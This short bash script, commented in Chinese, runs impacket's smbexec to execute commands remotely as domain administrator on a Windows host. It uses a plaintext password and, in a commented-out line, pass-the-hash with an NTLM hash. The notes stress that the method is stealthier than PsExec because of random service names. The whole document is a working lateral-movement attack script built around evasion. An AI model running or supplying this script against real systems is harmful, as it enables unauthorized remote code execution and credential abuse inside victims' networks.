#!/bin/bash
# SMBExec 远程执行脚本

TARGET="192.168.1.100"
DOMAIN="corp"
USER="administrator"
PASS="Password123!"
HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"

echo "[*] 使用密码执行"
impacket-smbexec ${DOMAIN}/${USER}:${PASS}@${TARGET}

echo "[*] 使用哈希 PTH 执行"
# impacket-smbexec -hashes ${HASH} ${DOMAIN}/${USER}@${TARGET}

# SMBExec 特点：
# - 通过创建临时服务执行命令
# - 命令输出写入临时文件后通过 SMB 读取
# - 比 PsExec 更隐蔽（服务名随机）
# - 需要 445 端口和 ADMIN$ 共享
